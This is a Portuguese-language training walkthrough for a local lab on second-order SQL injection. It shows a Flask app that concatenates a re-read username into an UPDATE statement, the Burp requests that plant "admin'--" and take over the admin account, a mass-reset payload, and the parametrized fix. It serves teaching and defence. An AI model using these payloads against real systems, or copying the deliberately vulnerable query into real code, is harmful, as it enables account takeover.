# Walkthrough — sqli-second-order

## 1. Contexto

O app tem dois fluxos que compartilham uma tabela `users` no SQLite.

- **Cadastro** — `POST /register` com `{"username": ..., "password": ...}` — insere um novo usuário. O username entra por uma **query parametrizada**: o texto SQL mantém um **placeholder** `?` e o valor é entregue ao driver separadamente, então o valor nunca pode ser lido como SQL. Um payload no username é gravado como string literal; nada executa.
- **Troca de senha** — `POST /change-password` com `{"new_password": ...}` — é autenticado. Ele busca o **username do próprio usuário logado** no banco e monta um `UPDATE` para trocar a senha desse usuário.

Um `POST /login` mínimo liga os dois: ele autentica `{"username", "password"}` e devolve um cookie de sessão assinado para o change-password saber quem é você.

Isto é **second-order SQL injection** (também chamado de *stored SQL injection*), sob **A03 — Injection** no OWASP Top 10. Alguns termos, porque a lição inteira vive neles:

- Em **first-order** (ou *in-band*) SQL injection — o tipo do [`sqli-union-basic`](../sqli-union-basic/) — input não-confiável é concatenado numa query e detona na **mesma** request. A **source** (onde o valor não-confiável entra) e o **sink** (onde ele vira SQL) são a mesma request.
- Em **second-order**, o valor é gravado por uma request segura e detona **depois**, numa request **diferente**, quando o app o relê e o concatena. A source agora é uma **leitura do banco**, não a request HTTP na sua frente.
- Um **trust boundary** é a linha entre input não-confiável (o que veio de fora) e o dado que o código trata como confiável-interno. Este bug é o app reassumir confiança num valor *só porque ele veio do próprio banco* — mas esse valor entrou como input do atacante no cadastro, e **toda leitura do banco é input não-confiável de novo**.
- **Stacked queries** (vários statements numa chamada, tipo `...; DROP TABLE users`) *não* são o que este átomo usa — o `execute()` do `sqlite3` as rejeita de cara. O payload subverte o `WHERE` de um único statement.

Topologia: `vulnerable` em `127.0.0.1:8029` e `fixed` em `127.0.0.1:8129`, cada um um container Flask + SQLite auto-contido. Isto é uma **API — não há trilha browser.** Cada request abaixo é um bloco que você cola no **Burp Repeater**; a prova é uma resposta de login. Uma nota operacional: este lab **escreve** no banco, e o exploit troca a senha de uma conta semeada, então **para re-rodar do zero, `./atom down sqli-second-order && ./atom up sqli-second-order`** — o banco é efêmero e re-semeia num container novo.

## 2. Ache o bug

Abra [`vulnerable/app.py`](./vulnerable/app.py). O cadastro é seguro — olhe ele primeiro, porque o ponto todo é que atacá-lo não faz nada:

```python
@app.route("/register", methods=["POST"])
def register():
    ...
    # SAFE (parameterized): even a SQL payload in `username` is stored as a literal VALUE.
    conn.execute("INSERT INTO users (username, password) VALUES (?, ?)", (username, password))
```

Agora o segundo fluxo:

```python
@app.route("/change-password", methods=["POST"])
def change_password():
    uid = session.get("uid")
    ...
    # The logged-in user's username is READ BACK from the DB (parameterized read).
    uname = conn.execute("SELECT username FROM users WHERE id = ?", (uid,)).fetchone()["username"]
    # VULNERABLE: the username re-read from the DB is concatenated straight into the UPDATE...
    query = f"UPDATE users SET password = ? WHERE username = '{uname}'"
    conn.execute(query, (new_password,))
```

Olhe de perto esse `UPDATE`. Há dois valores nele, tratados de formas **opostas**. O `new_password` — input fresco *desta* request — passa por um placeholder `?`: seguro. O `uname` — relido do banco — é colado na string SQL com uma f-string: inseguro. O dev parametrizou o input em que estava pensando (a senha nova) e concatenou o que assumiu ser confiável (um username que já estava no banco). Faça a pergunta do auditor: *o username que eu escolhi no cadastro é relido aqui e colado no SQL — e se eu registrar um username que seja ele mesmo um payload?*

Nada nos *pontos de entrada* ajuda um atacante diretamente: `register` e `login` são os dois parametrizados. Um probe first-order clássico contra o login não acha nada —

```
POST /login HTTP/1.1
Host: 127.0.0.1:8029
Content-Type: application/json

{"username": "admin' OR '1'='1", "password": "x"}
```

— retorna `401 {"authenticated": false}`. Os pontos de entrada testam como seguros. A bomba tem que ser plantada pela porta segura e detonada pelo segundo fluxo.

## 3. Exploração via Burp Suite

Aponte o Burp para a API vulnerable em `127.0.0.1:8029` e trabalhe do Repeater. A cadeia é register → login → change-password, então você leva o cookie de sessão da resposta do login para a request de change-password.

**O cookie de sessão.** O `POST /login` responde com `Set-Cookie: session=...` — um cookie assinado do Flask. Copie esse valor `session=...` inteiro para um header `Cookie:` na sua request de change-password. (Fazer base64-decode do primeiro segmento dele mostra `{"uid": 5}` — o id da sua *própria* conta; o número depende de quantos usuários você registrou antes. O change-password lê esse id da sessão, nunca do corpo da request, então você só pode agir como você mesmo — o payload é que faz o trabalho, não um alvo escolhido.) Com `curl`, um cookie jar cuida disso pra você: `curl -c jar -b jar ...`.

### Baseline — o segundo fluxo funcionando normalmente

Registre um usuário normal, logue, troque a senha dele. Só a linha *dele* é tocada:

```
POST /register HTTP/1.1
Host: 127.0.0.1:8029
Content-Type: application/json

{"username": "normaluser", "password": "normalpw"}
```
→ `200 {"registered": true}`. Depois `POST /login` com o mesmo corpo captura o cookie, e:

```
POST /change-password HTTP/1.1
Host: 127.0.0.1:8029
Content-Type: application/json
Cookie: session=<da resposta do login>

{"new_password": "baseline123"}
```
→ `200 {"updated": true}`. Agora `normaluser` autentica com `baseline123`, e — o ponto — `admin` está intacto: `{"username": "admin", "password": "admin-lab-pw"}` ainda retorna `200 {"authenticated": true}`. Um username normal muda só a própria linha.

### Tempo 1 — plantar o payload (inócuo)

Registre um usuário cujo **username é um payload SQL**:

```
POST /register HTTP/1.1
Host: 127.0.0.1:8029
Content-Type: application/json

{"username": "admin'--", "password": "attackerpw"}
```

Resposta — `200`:

```json
{"registered": true}
```

Nada aconteceu com ninguém. O `INSERT` parametrizado gravou `admin'--` como um username literal (é uma string distinta de `admin`, então a constraint `UNIQUE` fica de boa). Prove que o plantio foi inócuo — `admin` ainda tem a senha original:

```
POST /login   {"username": "admin", "password": "admin-lab-pw"}
```
→ `200 {"authenticated": true}`. **Este é o cerne: atacar o cadastro diretamente não faz nada.** O perigo não é a escrita — é a leitura posterior.

### Tempo 2 — detonar pelo segundo fluxo

Logue como o usuário-payload (com a senha real dele), capture o cookie, e chame o change-password:

```
POST /login   {"username": "admin'--", "password": "attackerpw"}
```
→ `200 {"authenticated": true}` com `Set-Cookie: session=...`. Leve esse cookie:

```
POST /change-password HTTP/1.1
Host: 127.0.0.1:8029
Content-Type: application/json
Cookie: session=<da resposta do login>

{"new_password": "pwned123"}
```

Resposta — `200`:

```json
{"updated": true}
```

O servidor releu o seu username (`admin'--`) e o colou no `UPDATE`. A query que ele realmente rodou foi:

```sql
UPDATE users SET password = ? WHERE username = 'admin'--'
```

O `'--` no fim do seu username fechou o literal de string cedo e comentou o resto da linha, então o statement efetivo é `UPDATE users SET password = 'pwned123' WHERE username = 'admin'`. O `UPDATE` que deveria trocar a *sua* senha foi **redirecionado para a linha do `admin`**.

### Tempo 3 — a prova (takeover de conta)

A resposta do change-password não te contou nada (`updated: true` de qualquer jeito). A prova é um login: a senha do `admin` agora é `pwned123`.

```
POST /login   {"username": "admin", "password": "pwned123"}
```
→ `200 {"authenticated": true}` — **você tomou a conta do `admin`.** E a senha original está morta: `{"username": "admin", "password": "admin-lab-pw"}` agora retorna `401 {"authenticated": false}`.

O efeito é **cirúrgico**, e você pode confirmá-lo direto contra o banco do container:

```
$ docker exec -i sqli-second-order-vulnerable-1 python3 - <<'PY'
import sqlite3
c = sqlite3.connect("lab.db"); c.row_factory = sqlite3.Row
for r in c.execute("SELECT id, username, password FROM users ORDER BY id"):
    print(r["id"], repr(r["username"]), repr(r["password"]))
PY
1 'admin'      'pwned123'      # ← tomada
...
5 "admin'--"   'attackerpw'    # ← a PRÓPRIA linha do atacante, intacta
```

O `admin` mudou; a própria linha do atacante **não**. O `UPDATE` foi redirecionado por inteiro, não aplicado amplamente. O lab é isolado — os dois apps bindam só em `127.0.0.1`, o banco é fake e efêmero — e o payload é benigno: ele subverte um `UPDATE` numa senha fake pra provar o redirecionamento, sem rodar statements empilhados nem destrutivos.

## 4. O que a vuln NÃO é

O exploit é um username de aparência legítima e duas requests comuns, então é fácil tirar a lição errada. Mate as conclusões erradas.

**Não é um bug no cadastro / na escrita.** O `INSERT` é parametrizado e correto; o payload é gravado como texto inerte. Você viu isso no Tempo 1 — atacar o `/register` diretamente não muda nada. A escrita nunca foi o problema.

**Não é "sanitizar o input no ponto de entrada".** O instinto é "validar o `username` no cadastro — proibir aspas e `--`". Isso é uma blocklist no lugar errado: ela persegue a *forma* do payload (encodings, outros caracteres, outros caminhos que escrevem na tabela) e deixa o bug real — a segunda query concatena — intocado. Parametrizar ou sanitizar na *entrada* não viaja com o valor até o *ponto de uso*. O fix é parametrizar a segunda query (§6).

**Não é first-order SQL injection (`sqli-union-basic`).** Lá, o payload detona na mesma request que o carrega. Aqui não: um probe first-order contra os pontos de entrada não acha nada (você viu `{"username": "admin' OR '1'='1", ...}` retornar `401` na §2). O payload fica dormente no banco e detona só quando o *segundo* fluxo o relê — outra request, outra query.

**Não é RCE.** Ele subverte uma query pra mudar dado que não deveria; nada executa código.

**A prova de isolamento.** Um username *normal* passa pelos dois fluxos sem nada escapar, nos **dois** ports — você viu o baseline deixar o `admin` intacto. Só o username-payload, no app vulnerable, redireciona o `UPDATE`. No app fixed (§6), nem ele.

## 5. Impacto

Subversão de query no segundo fluxo → **takeover de conta**: o atacante troca a senha de outra conta e loga como ela, ganhando o que aquela conta alcança no contexto da vítima. O teto é o que a segunda query permite — aqui um `UPDATE` redirecionado, então um takeover direcionado com `admin'--`, ou um reset de senha em massa com um payload tipo `x' OR '1'='1` (que casa toda linha). Não é RCE, e não é um dump irrestrito. Second-order SQL injection tem outras faces no mundo real — um valor relido caindo num `SELECT` ou `INSERT` em vez disso — mas este átomo modela a face de takeover-via-`UPDATE` e não afirma mais que isso.

## 6. Por que o fix funciona

Rode a mesma cadeia contra a API fixed no port **8129** (veja o [`DIFF.pt-BR.md`](./DIFF.pt-BR.md) para a mudança). Registre `admin'--`, logue, e chame o change-password com `{"new_password": "pwned123"}` exatamente como antes. O takeover falha:

```
POST /login   {"username": "admin", "password": "pwned123"}
```
→ `401 {"authenticated": false}` — a senha do `admin` **não** mudou. E o `admin` com a senha original ainda funciona:

```
POST /login   {"username": "admin", "password": "admin-lab-pw"}
```
→ `200 {"authenticated": true}`.

O change-password corrigido passa o username relido como parâmetro:

```python
conn.execute("UPDATE users SET password = ? WHERE username = ?", (new_password, uname))
```

Agora `admin'--` é casado como **valor literal**, então o `UPDATE` atinge só a linha cujo username é exatamente `admin'--` — a *própria* linha do atacante. O banco confirma: no 8129, `admin` mantém `admin-lab-pw` e a própria linha do atacante (`admin'--`) vira `pwned123` — o change-password fez exatamente o que devia, trocando a *sua* senha e de mais ninguém.

A feature é idêntica nos dois ports; o baseline (um usuário normal trocando a própria senha) se comporta igual. Só o payload separa os dois. E o fix é especificamente **parametrizar a segunda query** — ele não sanitiza nem valida o username no cadastro (o cadastro sempre foi seguro), porque a lição é que **toda leitura do banco é input não-confiável de novo**, e o lugar de tratá-la como dado é a query que a usa. O [`DIFF.pt-BR.md`](./DIFF.pt-BR.md) percorre por que os reflexos "eu já parametrizei o cadastro" e "é só sanitizar o username" são a forma errada.
